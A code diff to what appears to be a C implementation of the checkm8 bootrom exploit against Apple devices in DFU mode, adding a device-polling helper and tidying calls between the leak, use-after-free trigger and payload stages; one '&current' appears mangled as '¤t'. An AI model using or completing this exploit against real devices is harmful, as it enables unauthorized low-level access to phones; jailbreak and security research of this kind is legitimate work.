@@ -16,6 +16,9 @@
 #define PWND_STR    "PWND:["
 #define NONCE_MAX_SIZE  20
 
+const uint16_t DFU_VID = 0x05AC;
+const uint16_t DFU_PID = 0x1227;
+
 uint8_t current_nonce[NONCE_MAX_SIZE] = { 0 };
 uint8_t empty[0x800] = { 0 };
 
@@ -42,6 +45,40 @@ static bool check_device_pwnd(libusb_device_handle* client) {
 static void close_device(libusb_device_handle *device) {
     libusb_close(device);
 	libusb_exit(NULL);
+}
+
+libusb_device_handle* acquire_device(uint16_t vid, uint16_t pid, unsigned int timeout_ms) {
+    libusb_device_handle *handle = NULL;
+    struct timespec start, current;
+    double elapsed = 0.0;
+
+    // 获取开始时间
+    clock_gettime(CLOCK_MONOTONIC, &start);
+
+    // 在超时时间内循环尝试查找设备
+    while (elapsed < timeout_ms / 1000.0) {
+        // 尝试查找并打开设备
+        handle = find_device_by_vid_pid(vid, pid);
+        
+        // 如果找到设备，返回句柄
+        if (handle != NULL) {
+            printf("Device acquired successfully (VID:0x%04x PID:0x%04x)\n", vid, pid);
+            return handle;
+        }
+
+        // 计算已用时间
+        clock_gettime(CLOCK_MONOTONIC, ¤t);
+        elapsed = (current.tv_sec - start.tv_sec) + 
+                 (current.tv_nsec - start.tv_nsec) / 1e9;
+
+        // 短暂休眠，避免过度占用 CPU
+        usleep(10000);  // 休眠 10ms
+    }
+
+    // 超时未找到设备
+    fprintf(stderr, "Failed to acquire device (VID:0x%04x PID:0x%04x) within %u ms\n", 
+            vid, pid, timeout_ms);
+    return NULL;
 }
 
 // 异步传输完成回调函数
@@ -201,7 +238,7 @@ int checkm8(libusb_device_handle* device, const exploit_config_t *config) {
     usb_reset(device);
     close_device(device);
 
-    device = acquire_device(10, false, true, NULL);
+    device = acquire_device(DFU_VID, DFU_PID, 1000);
     if (!device) {
         printf("device disappeared after leak stage\n");
         return -1;
@@ -215,7 +252,7 @@ int checkm8(libusb_device_handle* device, const exploit_config_t *config) {
 
     usleep(250 * 1000);
 
-    device = acquire_device(10, false, true, NULL);
+    device = acquire_device(DFU_VID, DFU_PID, 1000);
     if (!device) {
         printf("device disappeared after UaF trigger stage\n");
         return -1;
@@ -244,7 +281,7 @@ int checkm8(libusb_device_handle* device, const exploit_config_t *config) {
     usb_reset(device);
     close_device(device);
 
-    device = acquire_device(10, true, true, NULL);
+    device = acquire_device(DFU_VID, DFU_PID, 1000);
     if (!device) {
         printf("device disappeared after sending payload\n");
         return -1;
@@ -273,9 +310,9 @@ int main(void) {
 
     const exploit_config_t *config = get_config(0x8747);
 
-    libusb_device_handle *device = find_device_by_vid_pid(0x05ac, 0x1227);
+    libusb_device_handle *device = find_device_by_vid_pid(DFU_VID, DFU_PID);
     if (!device) {
-        prinf("dfu device not found!\n");
+        printf("dfu device not found!\n");
         return -1;
     }
 
